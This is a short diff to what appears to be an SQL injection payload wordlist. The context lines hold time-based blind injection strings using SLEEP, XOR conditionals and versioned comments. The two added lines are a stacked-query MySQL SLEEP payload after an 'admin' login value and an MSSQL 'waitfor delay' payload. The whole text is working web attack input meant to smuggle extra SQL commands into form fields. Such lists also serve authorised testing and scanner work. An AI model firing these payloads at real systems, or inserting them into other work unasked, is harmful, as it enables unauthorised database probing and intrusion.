@@ -15,3 +15,5 @@ xxxx AND 1=1#
 /*!00000AND*/ /*!00000SLEEP(15)*/--+
 'XOR(if(now()=sysdate(),sleep(5*2),0))OR'
 if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
+admin';SELECT SLEEP(1)#
+';waitfor delay '0:0:5'--
